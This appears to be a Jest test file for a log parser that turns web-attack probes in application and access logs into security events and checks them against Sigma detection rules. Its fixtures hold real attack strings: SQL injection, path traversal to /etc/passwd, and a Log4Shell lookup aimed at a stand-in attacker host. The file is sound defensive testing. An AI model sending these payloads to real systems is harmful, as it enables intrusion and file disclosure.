import { describe, expect, test } from "@jest/globals";
import { JSONObject } from "../../../../Types/JSON";
import {
  DETECTION_RULE_LIBRARY,
  DetectionRuleLibraryEntry,
} from "../../../../Types/SecurityEvent/DetectionRuleLibrary";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import OcsfSeverity from "../../../../Types/SecurityEvent/OcsfSeverity";
import SecurityEventRequestOutcome from "../../../../Types/SecurityEvent/SecurityEventRequestOutcome";
import { SigmaRule } from "../../../../Types/SecurityEvent/SigmaRule";
import WebAttackLogParser, {
  MAX_MESSAGE_TARGET_LENGTH,
  MAX_PAYLOAD_REACH,
  WEB_ATTACK_KIND_ATTRIBUTE,
  WEB_ATTACK_LABELS,
  WEB_ATTACK_PAYLOAD_ATTRIBUTE,
  WebAttackKind,
  buildWebAttackMessage,
  readAttackPayload,
  readRequestFromAttributes,
  severityForWebAttack,
} from "../../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import SigmaRuleParser from "../../../../Utils/SecurityEvent/Sigma/SigmaRuleParser";
import { FastestRun, fastestRun } from "../../../Helpers/FastestRun";
import { logLine } from "./LogParserFixtures";
import { sigmaRuleMatchesEvent } from "./SigmaTestMatcher";

/*
 * Attacks in an application's own logs - the lines an app writes when a
 * request it is handling holds an attack, rather than a web server's access
 * log. OneUptime's own servers write exactly this when a scanner probes them:
 *
 *   {"name":"Error","message":"Page not found - /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)","stack":"Error: Page not found - ...\n    at ..."}
 *
 * Before, such a line became an event whose message and target were the
 * whole JSON document, stack trace and all. Now the event reads the
 * request from the line's attributes, keeps the word that carries the
 * attack as its target, says the attack in one line, and grades it by how
 * far it got - while every rule of the library still fires on it.
 */

function errorLine(message: string, name: string = "Error"): string {
  return JSON.stringify({
    name,
    message,
    stack: `${name}: ${message}\n    at /usr/src/Common/Server/Utils/StartServer.ts:560:7\n    at Layer.handle [as handle_request] (/usr/src/Common/node_modules/express/lib/router/layer.js:95:5)`,
  });
}

function parseOne(
  body: string,
  attributes: JSONObject = {},
): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = WebAttackLogParser.parse(
    logLine(body, attributes),
  );

  expect(events).toHaveLength(1);

  return events[0]!;
}

function libraryRule(title: string): SigmaRule {
  const entry: DetectionRuleLibraryEntry | undefined =
    DETECTION_RULE_LIBRARY.find(
      (candidate: DetectionRuleLibraryEntry): boolean => {
        return candidate.title === title;
      },
    );

  expect(entry).toBeDefined();

  return SigmaRuleParser.parse(entry!.sigmaRuleYaml);
}

// The probes the screenshot of OneUptime's own Security Events showed.
const PROBES: Array<[string, string, WebAttackKind, string]> = [
  [
    "a time-based SQL injection in a sitemap offset",
    errorLine(
      "Page not found - /sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)",
    ),
    WebAttackKind.SqlInjection,
    "/sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)",
  ],
  [
    "a path traversal into a conference service",
    errorLine(
      "Page not found - /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService",
    ),
    WebAttackKind.PathTraversal,
    "/defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService",
  ],
  [
    "an overlong-encoded traversal Express could not decode",
    errorLine(
      "Failed to decode param '/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'",
      "URIError",
    ),
    WebAttackKind.PathTraversal,
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
  ],
  [
    "a WordPress plugin traversal",
    errorLine(
      "Page not found - /wp-admin/admin-ajax.php?action=proxy_image&url=/etc/passwd",
    ),
    WebAttackKind.PathTraversal,
    "/wp-admin/admin-ajax.php?action=proxy_image&url=/etc/passwd",
  ],
];

describe("WebAttackLogParser on an application's error log", () => {
  test.each(PROBES)(
    "%s: the target is the request, not the JSON and its stack",
    (_name: string, line: string, kind: WebAttackKind, target: string) => {
      const event: NormalizedSecurityEvent = parseOne(line);

      expect(event.attributes[WEB_ATTACK_KIND_ATTRIBUTE]).toBe(kind);
      expect(event.targetResource).toBe(target);
      expect(event.message).toBe(`${WEB_ATTACK_LABELS[kind]}: ${target}`);
      expect(event.message.includes("stack")).toBe(false);
      expect(event.message.includes("{")).toBe(false);
      expect(event.attributes["url.original"]).toBe(target);
    },
  );

  test.each(PROBES)(
    "%s: the library's rule still fires on it",
    (_name: string, line: string, kind: WebAttackKind) => {
      const title: string =
        kind === WebAttackKind.SqlInjection
          ? "SQL injection attempts"
          : "Path traversal attempts";

      expect(sigmaRuleMatchesEvent(libraryRule(title), parseOne(line))).toBe(
        true,
      );
    },
  );

  test("with no status in the line, the attack is Medium and its outcome waits for the trace", () => {
    const event: NormalizedSecurityEvent = parseOne(PROBES[0]![1]);

    expect(event.severityName).toBe(OcsfSeverity.Medium);
    expect(event.requestOutcome).toBeUndefined();
    expect(event.statusName).toBe("");
  });

  test("a line written inside a request takes the request from its attributes", () => {
    const event: NormalizedSecurityEvent = parseOne(PROBES[0]![1], {
      "http.request.method": "get",
      "url.full":
        "https://oneuptime.com/sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)",
      "http.response.status_code": "404",
      "client.address": "198.51.100.23",
      "user_agent.original": "Mozilla/5.0 (scanner)",
    });

    expect(event.activityName).toBe("GET");
    expect(event.principalIp).toBe("198.51.100.23");
    expect(event.targetResource).toBe(
      "https://oneuptime.com/sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356)",
    );
    expect(event.statusName).toBe("Failure");
    expect(event.requestOutcome).toBe(SecurityEventRequestOutcome.Rejected);
    expect(event.severityName).toBe(OcsfSeverity.Low);
    expect(event.message).toBe(
      "SQL injection attempt: GET https://oneuptime.com/sitemap.xml?offset=1;SELECT%20IF((SLEEP(16)),1,2356) → 404",
    );
    expect(event.attributes["user_agent.original"]).toBe(
      "Mozilla/5.0 (scanner)",
    );
  });

  test("the URL in the attributes is named even when the attack is elsewhere in the line", () => {
    const event: NormalizedSecurityEvent = parseOne(
      "WARN rejected search term ' or 1=1 -- on the products page",
      {
        "url.path": "/api/products",
        "url.query": "page=2",
        "http.request.method": "POST",
        "http.response.status_code": "400",
      },
    );

    // The rules read the attack in the target; the message names the request too.
    expect(event.targetResource).toBe("' or 1=1");
    expect(event.attributes["url.original"]).toBe("/api/products?page=2");
    expect(event.attributes[WEB_ATTACK_PAYLOAD_ATTRIBUTE]).toBe("' or 1=1");
    expect(event.message).toBe(
      "SQL injection attempt: POST /api/products?page=2 → 400 · ' or 1=1",
    );
    expect(
      sigmaRuleMatchesEvent(libraryRule("SQL injection attempts"), event),
    ).toBe(true);
  });

  test("a header lookup in an access log keeps the path it asked for, and the message names the lookup", () => {
    const event: NormalizedSecurityEvent = parseOne(
      '203.0.113.42 - - [19/Oct/2026:10:00:09 +0000] "GET /login HTTP/1.1" 302 0 "-" "${jndi:ldap://attacker.example/a}"',
    );

    expect(event.targetResource).toBe("/login");
    expect(event.message).toBe(
      "Log4Shell exploit attempt: GET /login → 302 · ${jndi:ldap://attacker.example/a}",
    );
    expect(event.attributes[WEB_ATTACK_PAYLOAD_ATTRIBUTE]).toBe(
      "${jndi:ldap://attacker.example/a}",
    );
    expect(event.severityName).toBe(OcsfSeverity.High);
    expect(
      sigmaRuleMatchesEvent(libraryRule("Log4Shell exploit attempt"), event),
    ).toBe(true);
  });

  test("a plain text line is read for its payload and its address", () => {
    const event: NormalizedSecurityEvent = parseOne(
      `ERROR ${"x".repeat(300)} rejected /static/../../etc/passwd from 203.0.113.9`,
    );

    expect(event.targetResource).toBe("/static/../../etc/passwd");
    expect(event.principalIp).toBe("203.0.113.9");
  });
});

describe("readAttackPayload", () => {
  test("reads the word around the marker, to a space or a double quote", () => {
    // Raw SQL in a sentence is split at its spaces: the marker is the word.
    expect(
      readAttackPayload(
        'GET "/item?id=1 union select password from users" HTTP',
        WebAttackKind.SqlInjection,
      ),
    ).toBe("union select");
    expect(
      readAttackPayload(
        "Page not found - /x?q=a%27%20or%201%3d1",
        WebAttackKind.SqlInjection,
      ),
    ).toBe("/x?q=a%27%20or%201%3d1");
  });

  test("a word quoted in single quotes is read without them", () => {
    expect(
      readAttackPayload(
        "Failed to decode param '/%c0%ae%c0%ae/etc/passwd'",
        WebAttackKind.PathTraversal,
      ),
    ).toBe("/%c0%ae%c0%ae/etc/passwd");
  });

  test("the quotes of an injection are part of it", () => {
    expect(
      readAttackPayload(
        "search for /item?id=1' or '1'='1 failed",
        WebAttackKind.SqlInjection,
      ),
    ).toBe("/item?id=1' or '1'='1");
  });

  test("reads the earliest marker of the kind", () => {
    expect(
      readAttackPayload(
        "a /one?q=union%20select b /two?q=sleep(5)",
        WebAttackKind.SqlInjection,
      ),
    ).toBe("/one?q=union%20select");
  });

  test("a kind the text does not hold reads nothing", () => {
    expect(readAttackPayload("/x?q=1", WebAttackKind.SqlInjection)).toBe("");
    expect(
      readAttackPayload("/x?q=union select", WebAttackKind.Log4Shell),
    ).toBe("");
  });

  test("an endless word is read no further than the reach either side", () => {
    const text: string = `${"a".repeat(10_000)}../../${"b".repeat(10_000)}`;
    const payload: string = readAttackPayload(
      text,
      WebAttackKind.PathTraversal,
    );

    expect(payload.length).toBe(MAX_PAYLOAD_REACH * 2 + "../../".length);
  });

  test("a megabyte line is read in time that grows with it", () => {
    const text: string = `${"x ".repeat(500_000)}/etc/passwd`;
    const read: FastestRun<string> = fastestRun({
      run: (): string => {
        return readAttackPayload(text, WebAttackKind.PathTraversal);
      },
      limitInMs: 2000,
    });

    expect(read.result).toBe("/etc/passwd");
    expect(read.inMs).toBeLessThan(2000);
  });
});

describe("readRequestFromAttributes", () => {
  test("reads OpenTelemetry's current names", () => {
    expect(
      readRequestFromAttributes({
        "http.request.method": "post",
        "url.full": "https://shop.example.com/login",
        "http.response.status_code": "401",
        "client.address": "198.51.100.7",
        "user_agent.original": "hydra",
      }),
    ).toEqual({
      method: "POST",
      target: "https://shop.example.com/login",
      status: 401,
      clientIp: "198.51.100.7",
      userAgent: "hydra",
    });
  });

  test("reads the older names, and joins a path with its query", () => {
    expect(
      readRequestFromAttributes({
        "http.method": "GET",
        "url.path": "/search",
        "url.query": "q=1",
        "http.status_code": "200",
        "net.peer.ip": "2001:db8::1",
        "http.user_agent": "curl/8",
      }),
    ).toEqual({
      method: "GET",
      target: "/search?q=1",
      status: 200,
      clientIp: "2001:db8::1",
      userAgent: "curl/8",
    });
  });

  test("ignores a client address that is not one, and a status that is not one", () => {
    const request: ReturnType<typeof readRequestFromAttributes> =
      readRequestFromAttributes({
        "client.address": "unknown",
        "http.response.status_code": "OK",
      });

    expect(request.clientIp).toBe("");
    expect(request.status).toBe(0);
    expect(request.target).toBe("");
  });
});

describe("buildWebAttackMessage", () => {
  test("says the attack, the request and the answer", () => {
    expect(
      buildWebAttackMessage({
        kind: WebAttackKind.PathTraversal,
        method: "get",
        target: "/static/../../etc/passwd",
        statusCode: 404,
      }),
    ).toBe("Path traversal attempt: GET /static/../../etc/passwd → 404");
  });

  test("says what it knows and nothing it does not", () => {
    expect(buildWebAttackMessage({ kind: WebAttackKind.Log4Shell })).toBe(
      "Log4Shell exploit attempt",
    );
    expect(
      buildWebAttackMessage({
        kind: WebAttackKind.SqlInjection,
        target: "/x?q=sleep(5)",
      }),
    ).toBe("SQL injection attempt: /x?q=sleep(5)");
  });

  test("names the payload only when the request does not already hold it", () => {
    expect(
      buildWebAttackMessage({
        kind: WebAttackKind.SqlInjection,
        target: "/x?q=sleep(5)",
        payload: "sleep(5)",
      }),
    ).toBe("SQL injection attempt: /x?q=sleep(5)");
  });

  test("cuts a long request so the message stays one readable line", () => {
    const message: string = buildWebAttackMessage({
      kind: WebAttackKind.PathTraversal,
      method: "GET",
      target: `/${"a".repeat(5000)}/../../etc/passwd`,
      statusCode: 404,
    });

    expect(message.length).toBeLessThan(MAX_MESSAGE_TARGET_LENGTH + 60);
    expect(message.endsWith("→ 404")).toBe(true);
  });
});

describe("severityForWebAttack", () => {
  test.each([
    [WebAttackKind.SqlInjection, undefined, OcsfSeverity.Medium],
    [
      WebAttackKind.SqlInjection,
      SecurityEventRequestOutcome.Rejected,
      OcsfSeverity.Low,
    ],
    [
      WebAttackKind.SqlInjection,
      SecurityEventRequestOutcome.ReachedApp,
      OcsfSeverity.Medium,
    ],
    [
      WebAttackKind.SqlInjection,
      SecurityEventRequestOutcome.Errored,
      OcsfSeverity.High,
    ],
    [
      WebAttackKind.SqlInjection,
      SecurityEventRequestOutcome.ReachedDatabase,
      OcsfSeverity.Critical,
    ],
    [
      WebAttackKind.PathTraversal,
      SecurityEventRequestOutcome.Rejected,
      OcsfSeverity.Low,
    ],
    [WebAttackKind.Log4Shell, undefined, OcsfSeverity.High],
    [
      WebAttackKind.Log4Shell,
      SecurityEventRequestOutcome.Rejected,
      OcsfSeverity.High,
    ],
    [
      WebAttackKind.Log4Shell,
      SecurityEventRequestOutcome.ReachedDatabase,
      OcsfSeverity.Critical,
    ],
  ])(
    "%s that %s is %s",
    (
      kind: WebAttackKind,
      outcome: SecurityEventRequestOutcome | undefined,
      severity: OcsfSeverity,
    ) => {
      expect(severityForWebAttack(kind, outcome)).toBe(severity);
    },
  );
});

describe("the request a line was written in", () => {
  test("every event carries the line's trace, span and session", () => {
    const [event] = WebAttackLogParser.parse({
      ...logLine(PROBES[0]![1]),
      traceId: " 4bf92f3577b34da6a3ce929d0e0e4736 ",
      spanId: "00f067aa0ba902b7",
      sessionId: "session-1",
    });

    expect(event!.traceId).toBe("4bf92f3577b34da6a3ce929d0e0e4736");
    expect(event!.spanId).toBe("00f067aa0ba902b7");
    expect(event!.sessionId).toBe("session-1");
  });

  test("OpenTelemetry's all-zero 'no trace' is no trace", () => {
    const [event] = WebAttackLogParser.parse({
      ...logLine(PROBES[0]![1]),
      traceId: "00000000000000000000000000000000",
      spanId: "0000000000000000",
    });

    expect(event!.traceId).toBe("");
    expect(event!.spanId).toBe("");
    expect(event!.sessionId).toBe("");
  });

  test("an id longer than any id is not kept", () => {
    const [event] = WebAttackLogParser.parse({
      ...logLine(PROBES[0]![1]),
      traceId: "a".repeat(500),
    });

    expect(event!.traceId).toBe("");
  });
});
